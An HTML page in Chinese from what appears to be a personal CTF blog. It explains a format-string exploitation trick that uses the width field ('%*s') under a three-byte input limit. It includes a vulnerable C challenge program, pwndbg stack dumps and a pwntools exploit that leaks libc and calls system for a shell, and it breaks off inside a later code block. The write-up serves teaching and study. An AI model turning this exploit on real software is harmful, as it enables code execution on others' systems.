@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="viol1t">
+
+
+
+
+
+<title>一种关于格式化字符串的新利用 | viol1t</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">viol1t</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/achievement">Achievement</a>
+                
+                    <a class="menu-item" href="/members">Members</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">viol1t</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/achievement">Achievement</a>
+                
+                    <a class="menu-item" href="/members">Members</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">一种关于格式化字符串的新利用</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">viol1t</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十一月 1, 2024&nbsp;&nbsp;17:39:12</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我们通常在pwn中遇到的栈上的格式化字符串类型，通常需要我们去寻找偏移去进行任意地址读或者任意地址写，然后使用工具fmtstr_payload快速钩爪格式化字符串，或者手搓payload进行got表改写等操作，但如果遇到限制字节等条件，往往只有手搓payload一条思路</p>
+<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>我们首先要对基本的格式化字符串利用有所熟悉</p>
+<p>格式化字符串基本格式如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%[parameter] [flag] [field width] [.precision] [length] type</span><br></pre></td></tr></table></figure>
+
+
+<p>中括号中的属性是可选的，不需要一定都写上，比如%08x，他就只用到了其中的一部分。下面举几个比较重要的属性讲一下：</p>
+<ul>
+<li><p>parameter</p>
+<p>n$，获取格式化字符串中的指定参数</p>
+</li>
+<li><p>flag</p>
+</li>
+<li><p>field width</p>
+<p>输出的最小宽度</p>
+</li>
+<li><p>precision</p>
+<p>输出的最大长度</p>
+</li>
+<li><p>length，输出的长度</p>
+<p>hh，输出一个字节</p>
+<p>h，输出一个双字节</p>
+</li>
+<li><p>type</p>
+<p>d&#x2F;i，有符号整数</p>
+<p>u，无符号整数</p>
+<p>x&#x2F;X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</p>
+<p>o，8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</p>
+<p>s，如果没有用 l 标志，输出 null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。</p>
+<p>c，如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。</p>
+<p>p， void * 型，输出对应变量的值。printf(“%p”,a) 用地址的格式打印变量 a 的值，printf(“%p”, &amp;a) 打印变量 a 所在的地址。</p>
+<p>n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</p>
+<p>%， ‘%’字面值，不接受任何 flags, width。</p>
+</li>
+</ul>
+<h2 id="利用手段"><a href="#利用手段" class="headerlink" title="利用手段"></a>利用手段</h2><p>我们通常在遇到诸如printf等一系列函数所造成的格式化字符串漏洞时，往往都是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf（buf）或printf（&amp;buf）</span><br></pre></td></tr></table></figure>
+
+<p>而我们常常忽视这里的filed width和precision，由此这种利用也不太为人所熟知</p>
+<p>这里笔者贴下一个简单利用的源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">one_printf</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%3s&quot;</span>, buf) &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Here: &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">one_call</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> (*ptr)(<span class="type">const</span> <span class="type">char</span> *);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%p&quot;</span>, &amp;ptr) &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    ptr(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> choice;</span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;1. printf&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;2. call&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice) &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (choice)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                do_printf();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                do_call();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice!&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里我们发现当我们输入1进行printf时，我们只有三字节的输入限制，而我们要如何恰好利用这三字节，去达到一个泄露任意堆&#x2F;栈高地址内容呢，这里就需要用到我们之前所忽视的width了，我们先看定义</p>
+<blockquote>
+<p>Width 字段指定要输出的最小字符数，通常用于填充表格输出中的固定宽度字段，否则字段会更小，尽管它不会导致超大字段的截断。</p>
+<p>宽度字段可以省略，也可以省略数字整数值，或者作为另一个参数传递时由星号 * 表示的动态值。例如，将导致打印 ‘ 10’，总宽度为 5 个字符。<code>printf(&quot;%*d&quot;, 5, 10)</code></p>
+</blockquote>
+<p>假如一个格式化参数是”% * d “，*代表第二个参数，控制输出的宽度，这个参数在调用约定中 所使用的寄存器是rsi，通常rsi是有内容的，比如栈上某一个地址，这个时候，输出字符串的宽度就会很大，会填满缓冲区，这里用到了对于_IO_padn这个函数对.vfprintf的一些跳转和定义，而在这里，填满缓冲区之后，你再输入%s，就会输出栈上的内容，进而能够让我们去泄露libc，从而进行后续ROP链的构造，而这里三字节的限制甚至能够直接让我们去getshell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele 40</span><br><span class="line">00:0000│ rsp 0x7fffda68ecc8 —▸ 0x7fc1de49cb9f (_IO_file_underflow+383) ◂— test rax, rax</span><br><span class="line">01:0008│     0x7fffda68ecd0 —▸ 0x7fc1de5f54a0 (_IO_file_jumps) ◂— 0x0</span><br><span class="line">02:0010│     0x7fffda68ecd8 ◂— 0x3</span><br><span class="line">03:0018│     0x7fffda68ece0 ◂— 0x1</span><br><span class="line">04:0020│     0x7fffda68ece8 —▸ 0x7fc1de5f8980 (_IO_2_1_stdin_) ◂— 0xfbad208b</span><br><span class="line">05:0028│     0x7fffda68ecf0 —▸ 0x7fc1de5f54a0 (_IO_file_jumps) ◂— 0x0</span><br><span class="line">06:0030│     0x7fffda68ecf8 —▸ 0x7fc1de5f94a0 (_nl_global_locale) —▸ 0x7fc1de5f56c0 (_nl_C_LC_CTYPE) —▸ 0x7fc1de5c1fd9 (_nl_C_name) ◂— 0x636d656d5f5f0043 /* &#x27;C&#x27; */</span><br><span class="line">07:0038│     0x7fffda68ed00 —▸ 0x7fc1de5f8980 (_IO_2_1_stdin_) ◂— 0xfbad208b</span><br><span class="line">08:0040│     0x7fffda68ed08 ◂— 0x1</span><br><span class="line">09:0048│     0x7fffda68ed10 ◂— 0xffffffffffffff80</span><br><span class="line">0a:0050│     0x7fffda68ed18 —▸ 0x7fc1de49df86 (_IO_default_uflow+54) ◂— cmp eax, -1</span><br><span class="line">0b:0058│     0x7fffda68ed20 ◂— 0xa /* &#x27;\n&#x27; */</span><br><span class="line">0c:0060│     0x7fffda68ed28 ◂— 0x0</span><br><span class="line">0d:0068│     0x7fffda68ed30 —▸ 0x7fffda68f450 —▸ 0x7fffda68f550 ◂— 0x0</span><br><span class="line">0e:0070│     0x7fffda68ed38 —▸ 0x7fc1de470280 (__vfscanf_internal+2176) ◂— cmp eax, -1</span><br><span class="line">0f:0078│     0x7fffda68ed40 ◂— 0x2020202020202020 (&#x27;        &#x27;)</span><br><span class="line">10:0080│     0x7fffda68ed48 ◂— 0x1</span><br><span class="line">11:0088│     0x7fffda68ed50 —▸ 0x7fc1de5c1e39 (dot) ◂— 0x747300445750002e /* &#x27;.&#x27; */</span><br><span class="line">12:0090│     0x7fffda68ed58 ◂— 0x2020202020202020 (&#x27;        &#x27;)</span><br><span class="line">13:0098│     0x7fffda68ed60 —▸ 0x7fffda68f440 ◂— 0x0</span><br><span class="line">14:00a0│     0x7fffda68ed68 ◂— 0x1</span><br><span class="line">15:00a8│     0x7fffda68ed70 —▸ 0x7fc1de5c1e39 (dot) ◂— 0x747300445750002e /* &#x27;.&#x27; */</span><br><span class="line">16:00b0│     0x7fffda68ed78 ◂— 0x2020202020202020 (&#x27;        &#x27;)</span><br><span class="line">17:00b8│     0x7fffda68ed80 —▸ 0x7fffda68f460 ◂— 0x3000000008</span><br><span class="line">18:00c0│     0x7fffda68ed88 ◂— 0x0</span><br><span class="line">19:00c8│     0x7fffda68ed90 ◂— 0x0</span><br><span class="line">1a:00d0│     0x7fffda68ed98 —▸ 0x7fffda68efe0 —▸ 0x7fffda68f000 ◂— 0x31 /* &#x27;1&#x27; */</span><br><span class="line">1b:00d8│     0x7fffda68eda0 ◂— 0x0</span><br><span class="line">1c:00e0│     0x7fffda68eda8 ◂— 0x0</span><br><span class="line">1d:00e8│     0x7fffda68edb0 ◂— 0x2</span><br><span class="line">1e:00f0│     0x7fffda68edb8 —▸ 0x7fffda68f000 ◂— 0x31 /* &#x27;1&#x27; */</span><br><span class="line">1f:00f8│     0x7fffda68edc0 —▸ 0x7fc1de5f56c0 (_nl_C_LC_CTYPE) —▸ 0x7fc1de5c1fd9 (_nl_C_name) ◂— 0x636d656d5f5f0043 /* &#x27;C&#x27; */</span><br><span class="line">20:0100│     0x7fffda68edc8 ◂— 0x0</span><br><span class="line">21:0108│     0x7fffda68edd0 ◂— 0x0</span><br><span class="line">22:0110│     0x7fffda68edd8 ◂— 0x100000000</span><br><span class="line">23:0118│     0x7fffda68ede0 ◂— 0x2020202000000000</span><br><span class="line">24:0120│     0x7fffda68ede8 ◂— 0x2020202000000000</span><br><span class="line">25:0128│     0x7fffda68edf0 —▸ 0x7fc1de5f94a0 (_nl_global_locale) —▸ 0x7fc1de5f56c0 (_nl_C_LC_CTYPE) —▸ 0x7fc1de5c1fd9 (_nl_C_name) ◂— 0x636d656d5f5f0043 /* &#x27;C&#x27; */</span><br><span class="line">26:0130│     0x7fffda68edf8 ◂— 0x0</span><br><span class="line">27:0138│     0x7fffda68ee00 ◂— 0xffffffff00000000</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里我们可以看到在我们使用了%s去泄露出libc时，这里对战结构输出的是stdin的地址</p>
+<ul>
+<li>+0x0030 [IO_2_1_stdin_]</li>
+<li>+0x0038 [__vfscanf_internal+2176]</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">─────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────</span><br><span class="line"> RAX  0xfffffffffffffe00</span><br><span class="line"> RBX  0x7fc1de5f8980 (_IO_2_1_stdin_) ◂— 0xfbad208b</span><br><span class="line"> RCX  0x7fc1de51a1f2 (read+18) ◂— cmp rax, -0x1000 /* &#x27;H=&#x27; */</span><br><span class="line"> RDX  0x1</span><br><span class="line"> RDI  0x0</span><br><span class="line"> RSI  0x7fc1de5f8a03 (_IO_2_1_stdin_+131) ◂— 0x5fa7f0000000000a /* &#x27;\n&#x27; */</span><br><span class="line"> R8   0x0</span><br><span class="line"> R9   0x1e1e</span><br><span class="line"> R10  0x40202c ◂— 0x6c61766e49006425 /* &#x27;%d&#x27; */</span><br><span class="line"> R11  0x246</span><br><span class="line"> R12  0x7fc1de5f96a0 (_IO_2_1_stdout_) ◂— 0xfbad2887</span><br><span class="line"> R13  0x7fc1de5f48a0 (_IO_helper_jumps) ◂— 0x0</span><br><span class="line"> R14  0xd68</span><br><span class="line"> R15  0x7fc1de5f5608 ◂— 0x0</span><br><span class="line"> RBP  0x7fc1de5f54a0 (_IO_file_jumps) ◂— 0x0</span><br><span class="line"> RSP  0x7fffda68ecc8 —▸ 0x7fc1de49cb9f (_IO_file_underflow+383) ◂— test rax, rax</span><br><span class="line"> RIP  0x7fc1de51a1f2 (read+18) ◂— cmp rax, -0x1000 /* &#x27;H=&#x27; */</span><br><span class="line">──────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────</span><br><span class="line"> ► 0x7fc1de51a1f2 &lt;read+18&gt;     cmp    rax, -0x1000</span><br><span class="line">   0x7fc1de51a1f8 &lt;read+24&gt;     ja     read+112                &lt;read+112&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x7fc1de51a250 &lt;read+112&gt;    mov    rdx, qword ptr [rip + 0xddc19]</span><br><span class="line">   0x7fc1de51a257 &lt;read+119&gt;    neg    eax</span><br><span class="line">   0x7fc1de51a259 &lt;read+121&gt;    mov    dword ptr fs:[rdx], eax</span><br><span class="line">   0x7fc1de51a25c &lt;read+124&gt;    mov    rax, 0xffffffffffffffff</span><br><span class="line">   0x7fc1de51a263 &lt;read+131&gt;    ret    </span><br><span class="line"> </span><br><span class="line">   0x7fc1de51a264 &lt;read+132&gt;    mov    rdx, qword ptr [rip + 0xddc05]</span><br><span class="line">   0x7fc1de51a26b &lt;read+139&gt;    neg    eax</span><br><span class="line">   0x7fc1de51a26d &lt;read+141&gt;    mov    dword ptr fs:[rdx], eax</span><br><span class="line">   0x7fc1de51a270 &lt;read+144&gt;    mov    rax, 0xffffffffffffffff</span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ rsp 0x7fffda68ecc8 —▸ 0x7fc1de49cb9f (_IO_file_underflow+383) ◂— test rax, rax</span><br><span class="line">01:0008│     0x7fffda68ecd0 —▸ 0x7fc1de5f54a0 (_IO_file_jumps) ◂— 0x0</span><br><span class="line">02:0010│     0x7fffda68ecd8 ◂— 0x3</span><br><span class="line">03:0018│     0x7fffda68ece0 ◂— 0x1</span><br><span class="line">04:0020│     0x7fffda68ece8 —▸ 0x7fc1de5f8980 (_IO_2_1_stdin_) ◂— 0xfbad208b</span><br><span class="line">05:0028│     0x7fffda68ecf0 —▸ 0x7fc1de5f54a0 (_IO_file_jumps) ◂— 0x0</span><br><span class="line">06:0030│     0x7fffda68ecf8 —▸ 0x7fc1de5f94a0 (_nl_global_locale) —▸ 0x7fc1de5f56c0 (_nl_C_LC_CTYPE) —▸ 0x7fc1de5c1fd9 (_nl_C_name) ◂— 0x636d656d5f5f0043 /* &#x27;C&#x27; */</span><br><span class="line">07:0038│     0x7fffda68ed00 —▸ 0x7fc1de5f8980 (_IO_2_1_stdin_) ◂— 0xfbad208b</span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► 0   0x7fc1de51a1f2 read+18</span><br><span class="line">   1   0x7fc1de49cb9f _IO_file_underflow+383</span><br><span class="line">   2   0x7fc1de49df86 _IO_default_uflow+54</span><br><span class="line">   3   0x7fc1de470280 __vfscanf_internal+2176</span><br><span class="line">   4   0x7fc1de46f162 __isoc99_scanf+178</span><br><span class="line">   5         0x4012c7 main+120</span><br><span class="line">   6   0x7fc1de430083 __libc_start_main+243</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>此时跳转到stdin我们就可以去接收libc从而getshell</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="comment">#moban</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)  <span class="comment">#32位arch=‘i386’</span></span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./chal&#x27;</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> +<span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() :</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;call&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;%*s&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;call&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;%s&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = get_addr() - <span class="number">0x1ec980</span></span><br><span class="line">li(<span class="string">&quot;libc-&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">dbg()</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;call&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="built_in">hex</span>(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>])))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 